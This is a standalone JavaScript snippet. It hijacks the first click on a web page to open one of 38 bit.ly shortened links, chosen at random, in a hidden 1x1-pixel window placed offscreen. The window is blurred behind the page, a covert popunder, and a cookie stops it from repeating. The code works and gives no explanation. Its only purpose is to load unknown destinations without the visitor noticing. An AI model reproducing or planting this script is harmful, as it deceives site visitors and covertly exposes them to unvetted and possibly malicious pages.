var listurl = [
"https://bit.ly/3kxoEJi",
"https://bit.ly/3zjbXpp",
"https://bit.ly/3y4qYv2",
"https://bit.ly/3irpFQu",
"https://bit.ly/3BojRQa",
"https://bit.ly/2VR8DU8",
"https://bit.ly/3zksZ6T",
"https://bit.ly/3rjVcrw",
"https://bit.ly/2TkIoEG",
"https://bit.ly/2VVnvRr",
"https://bit.ly/3hOWlUQ",
"https://bit.ly/3kxox0k",
"https://bit.ly/3rlqf6g",
"https://bit.ly/3xRiF61",
"https://bit.ly/3eU7v9d",
"https://bit.ly/3hODEk3",
"https://bit.ly/3hRhIF7",
"https://bit.ly/3BlvtDK",
"https://bit.ly/36KwAyT",
"https://bit.ly/3iv1dgT",
"https://bit.ly/3zco7AD",
"https://bit.ly/3iv1dxp",
"https://bit.ly/3wVW72y",
"https://bit.ly/3BjBPUb",
"https://bit.ly/3iv1cJR",
"https://bit.ly/3kELgYi",
"https://bit.ly/3hQodIf",
"https://bit.ly/36K6Cvn",
"https://bit.ly/3hORYJj",
"https://bit.ly/3xYbVDu",
"https://bit.ly/3hMh6k1",
"https://bit.ly/3xMT6CZ",
"https://bit.ly/3kClML1",
"https://bit.ly/3wOw9xT",
"https://bit.ly/3irpEMq",
"https://bit.ly/3eDClCD",
"https://bit.ly/2UtcCGb",
"https://bit.ly/3xViBSw",
]

var url_popup = listurl[Math.floor(Math.random() * listurl.length)];


      //<![CDATA[
      function addEvent(obj, eventName, func){
        if (obj.attachEvent)
        {
          obj.attachEvent("on" + eventName, func);
        }
        else if(obj.addEventListener)
        {
          obj.addEventListener(eventName, func, true);
        }
        else
        {
          obj["on" + eventName] = func;
        }
      }
      addEvent(window, "load", function(e){
        addEvent(document.body, "click", function(e)
                 {
                   var params = 'height='+1+',width=' +1+ ',left=9999,top=9999,location=0,toolbar=0,status=0,menubar=0,scrollbars=0,resizable=0';
                   if(document.cookie.indexOf("popup") == -1)
                   {
                     var w = window.open(url_popup,'popup', params);
                     if (w)
                     {
                       document.cookie = "popuphvfs=popup";
                       w.blur();
                     }
                     window.focus();
                   }
                 });
      });  
      //]]>
